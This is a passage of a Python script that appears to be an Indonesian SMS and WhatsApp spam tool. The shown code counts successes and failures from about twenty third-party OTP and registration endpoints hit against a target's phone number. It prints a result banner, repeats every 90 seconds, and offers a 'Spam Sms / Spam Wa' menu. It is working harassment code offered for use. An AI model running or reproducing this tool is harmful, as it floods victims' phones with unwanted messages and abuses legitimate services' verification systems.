            if "OK" in moka:
                done += 1
            else:
                die += 1
            if "PENDING" in AmmarGanz:
                done += 1
            else:
                die += 1
            if "success" in map:
                done += 1
            else:
                die += 1
            if "ok" in dekor2:
                done += 1
            else:
                die += 1
            if "ForgeRockTokensResult" in jenius:
                done += 1
            else:
                die += 1
            if "success" in req3:
                done += 1
            else:
                die += 1
            if "!" in pizzahut:
                done += 1
            else:
                die += 1
            if "OK" in bli:
                done += 1
            else:
                die += 1
            if "If your phone number is not registered, you will receive an OTP" in ha:
                done += 1
            else:
                die += 1
            if "Send successfully" in pos:
    	        done += 1
            else:
    	        die += 1
            if "Evermos OTP" in req:
    	        done += 1
            else:
    	        die += 1
            if "<Response [200]>" in response:
    	        done += 1
            else:
	            die += 1
            if "MESSAGE_SENT" in singsing:
	            done += 1
            else:
    	        die += 1
            if "success create accounts" in posting:
    	        done += 1
            else:
    	        die += 1
            if "AuthIDResponseType" in ammar_gamteng:
                done += 1
            else:
	            die += 1
            if "FailedPrecondition" in kum:
    	        die += 1
            else:
    	        done += 1
            if "send international sms success" in poss:
    	        done += 1
            else:
                die += 1
            if "error" in why:
    	        die += 1
            else:
    	        done += 1
            if "We can't process your request now. Please try again later or contact customer support." in poll:
    	        die += 1
            else:
    	        done += 1
            if "BAD_REQ" in reqi:
    	        die += 1
            else:
    	        done += 1
            if "Kode verifikasi berhasil dikirimkan" in pospp:
                done += 1
            else:
    	        die += 1
            print (f"{U}┌───────────────────────────────────── {putih}Result Spm {U}─────────────────────────────────────┐")
            print (f"{U}│ {Y}• {putih}Target Number {R}:{H} +62{nomor}                                   ")
            print (f"{U}│ {Y}• {putih}Your Ip       {R}:{H} {ip}                                         ")
            print (f"{U}│ {Y}• {putih}Time          {R}:{H} {localtime}                                  ")
            print (f"{U}└───┬──────────────────────────────────────────────────────────────────────────────────┘")
            print (f"{Y}    ├──{R}▶{putih} Total Success {B}:{H} ",done)
            print (f"{Y}    ╰──{R}▶{putih} Total Denied  {B}:{R} ",die)
            countdown(90)
    except KeyboardInterrupt:
        tanya()
    except requests.exceptions.ConnectionError:
        print (f"   {R}Error!! {putih}not connected to the network")
        tanya()

baca3 = requests.get("https://sfile.mobi/Mh0xdai8qy7",headers={"User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
baca2 = bs4.BeautifulSoup(baca3,"html.parser").find_all("div",{"class":"list"})[3].text 
ha=baca2.split("- Downloads:")[1]

banner=(f"""
{U}┌───────────────────────────────────── {putih}Helo User {U}─────────────────────────────────────┐
{U}│                                                                                     │
{U}│    {R}██████████████████████  {W}<{putih}|{W}>{putih}   [{R}•{putih}] Creator {R}:{B} AmmarBN & SanzzXD                {U}    │
{U}│    {R}██████████████████████  {W}<{putih}|{W}>{putih}   [{R}•{putih}] Youtube {R}:{B} Ammar Executed         {U}              │
{U}│    {putih}██████████████████████  {W}<{putih}|{W}>{putih}   [{R}•{putih}] Github  {R}:{H} github.com/AmmarrBN    {U}              │
{U}│    {putih}██████████████████████  {W}<{putih}|{W}>{putih}   [{R}•{putih}] User    {R}:{Y}{ha}                      {U}             │
{U}│                                                                                     │
{U}└─────────────────────────────────────────────────────────────────────────────────────┘""")
banner_menu=(f"""{U}┌───────────────────────────────────── {putih}Menu Tool {U}─────────────────────────────────────┐
{U}│  {Y}•{H} 01{R}.{putih} Spam Sms                   {Y}•{H} 02{R}.{putih} Spam Wa                                     {U}│
{U}│  {Y}•{H} 03{R}.{putih} Spam SW {R}({putih}Sms{R},{putih}Wa{R})           {Y}•{H} 04{R}.{putih} Support Admin                               {U}│
{U}│  {Y}•{H} 05{R}.{putih} About Tools                {Y}•{H} 06{R}. Exit {putih}Tools                                  {U}│
{U}└───┬─────────────────────────────────────────────────────────────────────────────────┘""")

def mulai():
    try:
        os.system("clear")
        print (f"{putih}WELLCOME TO MY TOOLS {H}✓")
        time.sleep(3)
        print (f"{putih}SUPPORTED BY {H}SANZZXD")
        time.sleep(3)
        print (f"SUBREK {bg2}")
        os.system("xdg-open https://youtube.com/channel/UCyyIDnXYJlRI_-2pAQqKr0g")
        time.sleep(3)
        os.system("clear")
        print (banner)
        print (banner_menu)
        pilih=input(f"{putih}    ╰──{Y}▶ {H}")
        if pilih == "01" or pilih == "1":
                os.system("clear")
                print (banner)
                sms()
        if pilih == "02" or pilih == "2":
            os.system("clear")
            print (banner)
            wangsaf()
        if pilih == "03" or pilih == "3":
            os.system("clear")
            print (banner)
            spm_sw()
        if pilih == "04" or pilih == "4":
            os.system("clear")
            print (banner)
            os.system("xdg-open https://youtube.com/channel/UCyyIDnXYJlRI_-2pAQqKr0g")
            print (f"   {putih}[{H}✓{putih}] Thx for {bg}{W}")
            tanya()
        if pilih == "05" or pilih == "5":
            os.system("clear")
            print (banner)
            time.sleep(5)
            about()
            tanya()
        if pilih == "06" or pilih == "6":
            sys.exit()
        if pilih == "" or pilih == " ":
            print (f"   {putih}[{R}!{putih}] Input Not Valid {R}!!!!{W}")
    except KeyboardInterrupt:
        print (f"   {putih}[]{B}System{putih}] Exit Detected.")
        sys.exit()
    except requests.exceptions.ConnectionError:
        print (f"   {R}Error!! {putih}not connected to the network")
        tanya()
mulai()
